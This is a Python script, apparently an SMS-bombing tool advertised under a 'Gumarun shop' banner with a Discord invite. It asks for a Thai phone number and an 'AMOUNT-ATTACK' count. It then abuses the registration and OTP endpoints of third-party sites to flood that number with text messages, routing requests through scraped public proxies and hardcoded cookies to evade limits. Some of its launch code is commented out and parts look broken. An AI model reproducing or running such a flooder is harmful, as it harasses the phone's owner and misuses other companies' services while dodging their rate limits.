
import requests as ru
import threading
import requests
import time
import random
import os
import datetime
import sys
import asyncio
import random
from re import search
from requests import Session
from re import search
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent
from requests import Session,post,get
os.system("clear")

headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()


async def home():
	print('''

   ▄████  █    ██   ███▄ ▄███▓ ▄▄▄      ██▀███   █    ██  ███▄    █ 
▒ ██▒ ▀█▒ ██  ▓██▒ ▓██▒▀█▀ ██▒▒████▄   ▓██ ▒ ██▒ ██  ▓██▒ ██ ▀█   █ 
░▒██░▄▄▄░▓██  ▒██░ ▓██    ▓██░▒██  ▀█▄ ▓██ ░▄█ ▒▓██  ▒██░▓██  ▀█ ██▒
░░▓█  ██▓▓▓█  ░██░ ▒██    ▒██ ░██▄▄▄▄██▒██▀▀█▄  ▓▓█  ░██░▓██▒  ▐▌██▒
░▒▓███▀▒░▒▒█████▓ ▒▒██▒   ░██▒ ▓█   ▓██░██▓ ▒██▒▒▒█████▓ ▒██░   ▓██░
 ░▒   ▒   ▒▓▒ ▒ ▒ ░░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒▓ ░▒▓░ ▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ 
  ░   ░   ░▒░ ░ ░ ░░  ░      ░  ░   ▒▒   ░▒ ░ ▒░ ░▒░ ░ ░ ░ ░░   ░ ▒░
░ ░   ░ ░  ░░ ░ ░  ░      ░     ░   ▒     ░   ░   ░░ ░ ░    ░   ░ ░ 
      ░     ░     ░       ░         ░     ░        ░              ░ 
      

                                    [Gumarun shop]
                          [https://discord.com/invite/hSbDP5Rmc8] 
	''')
	phone = input(" \x1b[96m[PHONE-NUMBER]  : \x1b[92m")
	
	if int(phone) <= 99999999 or int(phone) >= 999999999:
		print()
		print('\x1b[92m[ NONAME ]\x1b[00m : \x1b[91mEnter a Thailand phone number [ ! ] \x1b[00m')
		time.sleep(1)
		os.system('clear')
		os.system("python smsflood.py")
	else:
		jam = int(input("\x1b[96m [AMOUNT-ATTACK] : \x1b[92m"))
		print()
		print()
		
		ru.post("https://www.tgfone.com/signin/add_register",headers={"content-type": "application/x-www-form-urlencoded","user-agent": generate_user_agent(),"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "PHPSESSID=6d00c9f6d3b9b31a559fbc13edb560d4e571fb71;_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_gat_gtag_UA_163796127_1=1;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657955943.0;_ga=GA1.2.160165897.1657955937"},data=f"mobile_form={phone}&password_form=as257400As&confirmpassword_form=as257400As&name_form=skkdmx&lastname_form=dkmsxm&stype=2")

def api1():
			send = Session()
			send.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
			sms = send.post("https://api.jobbkk.com/v1/easy/otp_code",data="mobile="+phone,proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{sms}")


# for i in range(jam):
			# threading.Thread(target=api1).start()

# asyncio.run(home())









